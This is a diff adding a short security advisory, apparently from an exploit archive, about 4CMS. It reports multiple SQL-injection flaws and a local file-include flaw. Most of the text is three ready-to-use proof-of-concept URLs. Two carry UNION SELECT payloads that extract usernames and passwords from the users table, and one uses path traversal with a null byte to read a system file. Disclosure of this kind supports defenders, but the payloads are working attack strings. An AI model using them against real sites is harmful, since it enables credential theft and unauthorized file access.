@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/34355/info
+
+4CMS is prone to multiple SQL-injection vulnerabilities and a local file-include vulnerability because it fails to sufficiently sanitize user-supplied data.
+
+Exploiting the SQL-injection issues could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+The attacker can exploit the local file-include issue to execute arbitrary local script code and obtain sensitive information that may aid in further attacks.
+
+http://www.example.com/frontend/article.php?aid=-9999+union+all+select+1,2,concat(username,char(58),password),4,5,6,7,8,9,10+from+users--
+http://www.example.com/frontend/articles.php?cid=-999+union+all+select+1,2,concat(username,char(58),password),4,5,6,7,8,9,10+from+users--
+http://www.example.com/frontend/index.php?chlang=../../../../etc/services%00 
